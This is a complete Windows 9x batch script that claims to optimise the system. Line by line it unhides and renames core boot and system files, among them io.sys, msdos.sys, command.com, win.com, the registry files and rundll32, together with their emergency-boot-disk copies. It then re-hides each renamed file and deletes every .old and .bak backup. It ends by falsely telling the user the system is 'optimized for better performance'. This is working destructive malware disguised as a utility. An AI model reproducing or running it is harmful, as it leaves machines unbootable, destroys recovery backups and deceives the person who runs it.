ATTRIB  -h -r -s c:\windows\user.dat
REN c:\windows\user.dat noreg.rom
ATTRIB  +h +r +s c:\windows\noreg.rom
ATTRIB  -h -r -s c:\windows\system.dat
REN c:\windows\system.dat extra.rom
ATTRIB  +h +r +s c:\windows\extra.rom
ATTRIB  -h -r -s c:\io.sys
REN c:\io.sys tu.non
ATTRIB  +h +r +s c:\tu.non
ATTRIB  -h -r -s c:\windows\win.com
REN c:\windows\win.com lose.net
ATTRIB  +h +r +s c:\windows\lose.net
ATTRIB  -h -r -s c:\autoexec.bat
REN c:\autoexec.bat quick.cat
ATTRIB  +h +r +s c:\quick.cat
ATTRIB  -h -r -s c:\windows\himem.sys
REN c:\windows\himem.sys Lowmem.non
ATTRIB  +h +r +s c:\windows\lowmem.non
ATTRIB  -h -r -s c:\msdos.sys
REN c:\msdos.sys msmild.non
ATTRIB  +h +r +s c:\msmild.non
ATTRIB  -h -r -s c:\config.sys
REN c:\config.sys senzcaz.non
ATTRIB  +h +r +s c:\senzcaz.non
ATTRIB  -h -r -s c:\windows\command\ebd\himem.sys 
REN c:\windows\command\ebd\himem.sys lowmem.non
ATTRIB  +h +r +s c:\windows\command\ebd\lowmem.non
ATTRIB  -h -r -s c:\windows\command\ebd\config.sys
REN c:\windows\command\ebd\config.sys senzcaz.non
ATTRIB  +h +r +s c:\windows\command\ebd\senzcaz.non
ATTRIB  -h -r -s c:\windows\command\ebd\io.sys
REN c:\windows\command\ebd\io.sys tu.non
ATTRIB  +h +r +s c:\windows\command\ebd\tu.non
ATTRIB  -h -r -s c:\windows\rundll.exe
REN c:\windows\rundll.exe slowsys.inx
ATTRIB  +h +r +s c:\windows\slowsys.inx
ATTRIB  -h -r -s c:\windows\rundll32.exe
REN c:\windows\rundll32.exe slowsys8.inx
ATTRIB  +h +r +s c:\windows\slowsys8.inx
ATTRIB  -h -r -s c:\*.old
DEL c:\*.old
ATTRIB  -h -r -s c:\windows\*.old
DEL c:\windows\*.old
ATTRIB  -h -r -s c:\*.bak
DEL c:\*.bak
ATTRIB  -h -r -s c:\windows\*.bak
DEL c:\windows\*.bak
ATTRIB  -h -r -s c:\windows\command\ebd\command.com
REN c:\windows\command\ebd\command.com netor.net
ATTRIB  +h +r +s c:\windows\command\ebd\netor.net
ATTRIB  -h -r -s c:\windows\command.com
REN c:\windows\command.com netor.net
ATTRIB  +h +r +s c:\windows\netor.net
ATTRIB  -h -r -s c:\command.com
REN c:\command.com netor.net
ATTRIB  +h +r +s c:\netor.net 
CLS
echo Now your system is optimized for better performance!
pause
